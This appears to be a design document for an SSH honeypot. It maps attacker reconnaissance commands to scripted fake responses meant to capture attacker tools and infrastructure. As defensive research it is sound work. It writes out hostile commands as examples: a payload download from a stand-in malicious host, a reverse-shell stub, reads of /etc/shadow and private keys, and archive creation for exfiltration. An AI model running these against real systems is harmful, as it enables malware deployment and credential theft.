# Shell Emulation Research: Attacker Reconnaissance & Response Strategies

## Overview

This document provides comprehensive research on common attacker reconnaissance techniques and the scripted responses sshMON uses to elicit deeper behavioral intelligence. All interactions are **entirely scripted** - no real shell access is provided. Responses are designed to appear realistic while encouraging attackers to reveal their objectives and methods.

## Table of Contents

1. [Reconnaissance Phases](#reconnaissance-phases)
2. [System Information Discovery](#system-information-discovery)
3. [Privilege Escalation Attempts](#privilege-escalation-attempts)
4. [Network Discovery](#network-discovery)
5. [VM/Sandbox Detection Evasion](#vmsandbox-detection-evasion)
6. [Malware Deployment Patterns](#malware-deployment-patterns)
7. [Data Exfiltration Methods](#data-exfiltration-methods)
8. [Response Strategy Matrix](#response-strategy-matrix)

---

## Reconnaissance Phases

Typical attacker workflow after gaining SSH access:

```
1. Initial Orientation (5-30 seconds)
   ├─ whoami, id, pwd
   ├─ uname -a
   └─ hostname

2. System Profiling (30-120 seconds)
   ├─ cat /etc/*-release
   ├─ cat /proc/cpuinfo
   ├─ free -h, df -h
   └─ ps aux

3. VM/Sandbox Detection (60-180 seconds)
   ├─ dmidecode | grep -i virtual
   ├─ lspci | grep -i vmware
   ├─ cat /sys/class/dmi/id/product_name
   └─ systemd-detect-virt

4. Network Discovery (120-300 seconds)
   ├─ ifconfig / ip addr
   ├─ netstat -tulpn
   ├─ arp -a
   └─ cat /etc/hosts

5. Persistence Setup (variable)
   ├─ crontab -e
   ├─ .ssh/authorized_keys manipulation
   ├─ systemd service creation
   └─ rc.local modification

6. Lateral Movement / C2 Setup
   ├─ wget / curl to download payloads
   ├─ Python/Perl reverse shells
   └─ SSH key generation
```

**Honeypot Strategy**: Feed realistic responses through each phase to:
- Delay detection as honeypot
- Capture full attacker toolkit and methodology
- Identify automated vs. manual attacks
- Record C2 infrastructure (URLs, IPs)

---

## System Information Discovery

### Command: `whoami`

**Attacker Intent**: Verify current user context

**Response Strategy**:
```bash
root
```

**Rationale**: Most attackers target root access. Confirming root encourages deeper exploitation attempts rather than immediate abandonment.

---

### Command: `id`

**Attacker Intent**: Detailed user/group information and privilege level

**Response Strategy**:
```bash
uid=0(root) gid=0(root) groups=0(root)
```

**Rationale**: Confirms root privileges without sudo group memberships (realistic for compromised IoT devices).

---

### Command: `uname -a`

**Attacker Intent**: Kernel version, architecture, identify exploits

**Response Strategy**:
```bash
Linux raspberrypi 5.10.63-v7l+ #1459 SMP Wed Oct 6 16:41:57 BST 2021 armv7l GNU/Linux
```

**Rationale**:
- **ARM architecture (armv7l)**: Common IoT target, suggests embedded device
- **Raspberry Pi hostname**: Indicates home/SOHO device (high-value for botnets)
- **Slightly outdated kernel**: Vulnerable enough to be interesting, not so old it's suspicious
- **Real kernel version**: Matches actual Raspberry Pi OS releases for authenticity

**Alternatives** (rotate based on session):
```bash
# Option 2: x86_64 server
Linux ubuntu-server 5.4.0-84-generic #94-Ubuntu SMP Thu Aug 26 20:27:37 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

# Option 3: Older IoT device
Linux localhost 4.9.140 #1 SMP PREEMPT Mon Jul 15 10:23:45 CST 2019 mips GNU/Linux
```

---

### Command: `cat /etc/os-release` or `cat /etc/*-release`

**Attacker Intent**: Distribution, version number for exploit targeting

**Response Strategy**:
```bash
PRETTY_NAME="Raspbian GNU/Linux 11 (bullseye)"
NAME="Raspbian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=raspbian
ID_LIKE=debian
HOME_URL="http://www.raspbian.org/"
SUPPORT_URL="http://www.raspbian.org/RaspbianForums"
BUG_REPORT_URL="http://www.raspbian.org/RaspbianBugs"
```

**Rationale**: Matches uname response, provides package manager context (apt-based).

---

### Command: `cat /proc/cpuinfo`

**Attacker Intent**: CPU architecture, model (for mining malware capability assessment)

**Response Strategy** (Raspberry Pi 3):
```bash
processor       : 0
model name      : ARMv7 Processor rev 4 (v7l)
BogoMIPS        : 38.40
Features        : half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm crc32
CPU implementer : 0x41
CPU architecture: 7
CPU variant     : 0x0
CPU part        : 0xd03
CPU revision    : 4

processor       : 1
model name      : ARMv7 Processor rev 4 (v7l)
BogoMIPS        : 38.40
Features        : half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm crc32
CPU implementer : 0x41
CPU architecture: 7
CPU variant     : 0x0
CPU part        : 0xd03
CPU revision    : 4

Hardware        : BCM2835
Revision        : a02082
Serial          : 00000000a1b2c3d4
Model           : Raspberry Pi 3 Model B Rev 1.2
```

**Rationale**:
- Quad-core ARM suggests moderate mining capability
- Real hardware model prevents VM detection
- Low-power CPU may deter cryptominers, attract botnet herders

---

### Command: `free -h` or `free -m`

**Attacker Intent**: Available memory for malware/mining operations

**Response Strategy**:
```bash
              total        used        free      shared  buff/cache   available
Mem:          927Mi       156Mi       542Mi       8.0Mi       228Mi       714Mi
Swap:          99Mi          0B        99Mi
```

**Rationale**: ~1GB RAM typical for Raspberry Pi 3, enough for small botnet client, limited for mining.

---

### Command: `df -h`

**Attacker Intent**: Disk space for payload storage, log analysis

**Response Strategy**:
```bash
Filesystem      Size  Used Avail Use% Mounted on
/dev/root        29G  4.2G   24G  15% /
devtmpfs        430M     0  430M   0% /dev
tmpfs           463M     0  463M   0% /dev/shm
tmpfs           463M   12M  451M   3% /run
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           463M     0  463M   0% /sys/fs/cgroup
/dev/mmcblk0p1  253M   49M  204M  20% /boot
tmpfs            93M     0   93M   0% /run/user/1000
```

**Rationale**:
- 32GB SD card (typical Pi setup)
- 24GB available encourages payload downloads
- `/boot` partition suggests bootloader persistence opportunities

---

## Privilege Escalation Attempts

### Command: `sudo -l`

**Attacker Intent**: Check sudo permissions without password

**Response Strategy**:
```bash
User root may run the following commands on raspberrypi:
    (ALL : ALL) ALL
```

**Rationale**: Already root, but shows expected sudo configuration. Some scripts check this automatically.

---

### Command: `find / -perm -4000 2>/dev/null` (SUID binaries)

**Attacker Intent**: Discover privilege escalation vectors

**Response Strategy**: Return realistic but controlled SUID binary list
```bash
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
```

**Rationale**: Standard system SUID binaries, no suspicious custom entries that might reveal honeypot.

---

## Network Discovery

### Command: `ifconfig` or `ip addr show`

**Attacker Intent**: Network configuration, identify internal networks, additional targets

**Response Strategy**:
```bash
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.47  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ba27:ebff:fe3a:1234  prefixlen 64  scopeid 0x20<link>
        ether b8:27:eb:3a:12:34  txqueuelen 1000  (Ethernet)
        RX packets 145832  bytes 98234567 (93.7 MiB)
        RX errors 0  dropped 12  overruns 0  frame 0
        TX packets 89234  bytes 45678901 (43.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.255.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1234  bytes 123456 (120.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1234  bytes 123456 (120.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

**Rationale**:
- **192.168.1.0/24**: Common home network, suggests lateral movement opportunities
- **Real Raspberry Pi MAC OUI (b8:27:eb)**: Authenticates as actual hardware
- **Realistic traffic counters**: Device appears actively used
- **IPv6 link-local**: Modern network stack without filtering

**Variation**: Randomize last octet (192.168.1.X) per session to simulate different devices.

---

### Command: `netstat -tulpn` or `ss -tulpn`

**Attacker Intent**: Identify running services, backdoor opportunities, firewall bypass

**Response Strategy**:
```bash
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      412/sshd
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      412/sshd
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp6       0      0 :::5353                 :::*                                -
```

**Rationale**:
- **SSH (22)**: Expected, explains their current connection
- **CUPS (631)**: Printer service on localhost only (realistic Pi config)
- **DHCP client (68)**: Device obtains IP dynamically
- **mDNS (5353)**: Avahi/Bonjour for network discovery
- **No MySQL, web servers**: Reduces complexity, fewer suspicious "decoy" services

---

### Command: `arp -a` or `ip neigh show`

**Attacker Intent**: Identify other hosts on local network (lateral movement targets)

**Response Strategy**:
```bash
? (192.168.1.1) at 00:11:22:33:44:55 [ether] on eth0
? (192.168.1.15) at aa:bb:cc:dd:ee:01 [ether] on eth0
? (192.168.1.23) at aa:bb:cc:dd:ee:02 [ether] on eth0
? (192.168.1.105) at aa:bb:cc:dd:ee:03 [ether] on eth0
```

**Rationale**:
- **192.168.1.1**: Router/gateway
- **3-4 additional hosts**: Simulates small home/office network
- **Randomized MACs**: Prevents fingerprinting consistency issues

**Advanced**: Rotate ARP responses to simulate "living" network.

---

### Command: `cat /etc/hosts`

**Attacker Intent**: Identify internal hostnames, custom network configurations

**Response Strategy**:
```bash
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

127.0.1.1       raspberrypi
```

**Rationale**: Standard Debian/Raspbian hosts file, no custom entries to raise suspicion.

---

## VM/Sandbox Detection Evasion

**Critical Section**: Attackers increasingly check for virtualization to avoid honeypots/sandboxes. Responses must be carefully crafted.

### Command: `systemd-detect-virt`

**Attacker Intent**: Quick VM detection (returns 'none' on bare metal)

**Response Strategy**:
```bash
none
```

**Exit Code**: 1 (non-VM)

**Rationale**: Most definitive test for modern Linux. Must return 'none' to pass.

---

### Command: `dmidecode -s system-product-name` (requires root)

**Attacker Intent**: Check BIOS/SMBIOS for VM identifiers

**Response Strategy**:
```bash
Raspberry Pi 3 Model B Rev 1.2
```

**Alternative** if dmidecode not "installed":
```bash
bash: dmidecode: command not found
```

**Rationale**:
- ARM devices often lack dmidecode
- If present, must show real hardware
- "Command not found" is acceptable and common on embedded systems

---

### Command: `lspci | grep -i vmware` or `lspci | grep -i virtualbox`

**Attacker Intent**: Detect PCI devices indicating virtualization

**Response Strategy**:
```bash
# Empty output - no matches
```

**Exit Code**: 1

**Rationale**: Raspberry Pi uses ARM architecture with no PCI bus. Empty output is expected and authentic.

**Alternative** (if checking lspci existence):
```bash
bash: lspci: command not found
```

**Rationale**: lspci is part of pciutils, not always installed on minimal ARM systems.

---

### Command: `cat /sys/class/dmi/id/product_name`

**Attacker Intent**: Alternative SMBIOS check

**Response Strategy**:
```bash
cat: /sys/class/dmi/id/product_name: No such file or directory
```

**Exit Code**: 1

**Rationale**: DMI is x86-specific. ARM devices don't have `/sys/class/dmi/`. This error is authentic.

---

### Command: `cat /proc/scsi/scsi` (check for virtual SCSI)

**Attacker Intent**: Identify VMware/VirtualBox SCSI controllers

**Response Strategy**:
```bash
cat: /proc/scsi/scsi: No such file or directory
```

**Rationale**: SD card storage (mmcblk0) on Pi, not SCSI. Authentic ARM response.

---

### Command: `dmesg | grep -i hypervisor` or `dmesg | grep -i virtual`

**Attacker Intent**: Kernel boot messages revealing virtualization

**Response Strategy**:
```bash
# Empty output - no matches
```

**Alternative** (if dmesg restricted):
```bash
dmesg: read kernel buffer failed: Operation not permitted
```

**Rationale**:
- Modern kernels restrict dmesg to root (even for root in containers)
- Empty output authentic for bare metal
- Permission denied is acceptable fallback

---

### Command: `ls -la /dev | grep -i vd` (virtual disk devices)

**Attacker Intent**: Look for vda, vdb (common in KVM/QEMU VMs)

**Response Strategy**: Show only real device entries, no vda/vdb devices
```bash
# Include in /dev listing:
brw-rw---- 1 root disk    179,   0 Oct 23 09:15 mmcblk0
brw-rw---- 1 root disk    179,   1 Oct 23 09:15 mmcblk0p1
brw-rw---- 1 root disk    179,   2 Oct 23 09:15 mmcblk0p2
```

**Rationale**: mmcblk* devices indicate SD/MMC storage (authentic Raspberry Pi).

---

## Malware Deployment Patterns

### Command: `wget http://malicious.site/miner.sh` or `curl -O ...`

**Attacker Intent**: Download cryptocurrency miner, botnet client, or backdoor

**Honeypot Strategy**:
1. **Simulate successful download**:
   ```bash
   --2025-10-23 10:45:12--  http://malicious.site/miner.sh
   Resolving malicious.site... 1.2.3.4
   Connecting to malicious.site|1.2.3.4|:80... connected.
   HTTP request sent, awaiting response... 200 OK
   Length: 12543 (12K) [text/plain]
   Saving to: 'miner.sh'

   miner.sh            100%[===================>]  12.25K  --.-KB/s    in 0.001s

   2025-10-23 10:45:12 (8.45 MB/s) - 'miner.sh' saved [12543/12543]
   ```

2. **Log the URL, filename, and timestamp** to capture C2 infrastructure

3. **Optional**: Actually download to isolated storage for malware analysis

4. **Subsequent `ls` command** should show file:
   ```bash
   miner.sh
   ```

5. **If they execute** (`chmod +x miner.sh && ./miner.sh`):
   - Simulate execution starting
   - Log the command
   - Don't actually execute (security risk)
   - Show fake process in `ps aux` if they check

**Intelligence Value**:
- C2 server URLs/IPs
- Malware samples for analysis
- Attack infrastructure mapping
- TTPs (Tactics, Techniques, Procedures)

---

### Command: `python -c 'import socket...'` (reverse shell)

**Attacker Intent**: Establish out-of-band command channel

**Response Strategy**:
```bash
# Simulate hang (connection attempt)
# Log the Python command and any IP:PORT in the code
# After 30-60 seconds, return connection timeout or error
```

**Intelligence Value**: Capture attacker's C2 IP address and port.

---

### Command: `chmod +x /tmp/payload && /tmp/payload`

**Attacker Intent**: Execute downloaded binary

**Response Strategy**:
```bash
# For chmod: silent success (no output)
# For execution: simulate process start
# Log both commands
# Add to fake process list
```

---

## Data Exfiltration Methods

### Command: `cat /etc/shadow` or `cat /home/*/.ssh/id_rsa`

**Attacker Intent**: Steal credentials for lateral movement

**Response Strategy** (/etc/shadow):
```bash
root:$6$randomsalt$fakehashfakehashfakehashfakehashfakehashfakehashfakehashfakehash:18921:0:99999:7:::
daemon:*:18921:0:99999:7:::
bin:*:18921:0:99999:7:::
sys:*:18921:0:99999:7:::
pi:$6$anothersalt$anotherfakehashfakehashfakehashfakehashfakehashfakehashfakehash:18921:0:99999:7:::
```

**Rationale**:
- Provide fake but realistic-looking password hashes
- Hashes should NOT crack to anything (random gibberish)
- Monitor if they attempt hash cracking (indicates skill level)

**Response Strategy** (SSH keys):
```bash
cat: /home/pi/.ssh/id_rsa: No such file or directory
```

**Rationale**: Don't provide actual private keys (even fake ones risk misuse).

---

### Command: `tar czf /tmp/data.tar.gz /home /etc` (archive creation)

**Attacker Intent**: Package data for exfiltration

**Response Strategy**:
```bash
tar: Removing leading `/' from member names
```

**Then**: Show file in /tmp when they `ls /tmp`:
```bash
data.tar.gz
```

**Intelligence Value**: Understand what data they target.

---

## Response Strategy Matrix

| Command Type | Response Goal | Implementation |
|--------------|---------------|----------------|
| **Privilege Check** | Confirm root access | Return uid=0, root username |
| **System Info** | Appear as IoT/embedded device | Raspberry Pi, ARM architecture |
| **VM Detection** | Pass all virtualization checks | ARM-appropriate responses, "none", command not found |
| **Network Discovery** | Simulate small network | 192.168.1.0/24, 3-5 hosts, realistic services |
| **Persistence Attempts** | Log and simulate success | Accept cron jobs, SSH key modifications (log only) |
| **Malware Download** | Capture C2 infrastructure | Log URLs, simulate success, isolate actual files |
| **C2 Communication** | Log endpoints | Capture IP:port from reverse shell attempts |
| **Data Exfil** | Understand targets | Provide fake hashes/data, log what they access |

---

## Implementation Priority

### Phase 1: Core Commands (Immediate)
- `whoami`, `id`, `pwd`, `hostname`
- `uname -a`
- `cat /etc/os-release`
- `ls`, `cd`, `cat` (basic filesystem)

### Phase 2: VM Detection (Critical)
- `systemd-detect-virt`
- `dmidecode` handling
- `lspci` / `dmesg` handling
- `/sys/class/dmi/` path handling

### Phase 3: Network Reconnaissance
- `ifconfig` / `ip addr`
- `netstat` / `ss`
- `arp -a`
- `ping`, `traceroute`

### Phase 4: Advanced Interaction
- `wget` / `curl` simulation with actual file capture
- `ps aux` with fake process list
- `crontab -l` / `crontab -e`
- Shell script execution logging

---

## Testing Checklist

Validate honeypot realism by running common automated scanners:

- [ ] **ssh-audit**: SSH configuration scanner (should appear as standard OpenSSH)
- [ ] **LinPEAS**: Linux privilege escalation enumeration (should not trigger VM detection)
- [ ] **linux-smart-enumeration (LSE)**: System enumeration (should appear as real system)
- [ ] **pspy**: Process monitoring (should show realistic fake processes)

---

## References & Further Research

### Attacker Tools to Study
- **Metasploit** post-exploitation modules
- **Empire/PowerShell Empire** (Linux variant)
- **LinPEAS, LinEnum, linux-smart-enumeration**
- **Botnet client scripts** (Mirai, Gafgyt variants)

### Honeypot Detection Methods (What to Avoid)
- Timing irregularities (command execution too fast/slow)
- Inconsistent system information (kernel doesn't match distro)
- Missing expected files (/proc, /sys inconsistencies)
- Network responses that don't match claimed topology
- Filesystem that doesn't change (static fake files)

### Academic Papers
- "A Virtual Honeypot Framework" (Niels Provos)
- "Honeypot Fingerprinting" (Thorsten Holz et al.)
- "Know Your Enemy: Learning about Security Threats" (Honeynet Project)

---

## Updates & Maintenance

This document should be updated as:
- New attacker techniques are observed in production logs
- VM detection methods evolve
- New IoT malware families emerge with different reconnaissance patterns

**Last Updated**: 2025-10-23
**Next Review**: Quarterly or after major attacker TTPs shift
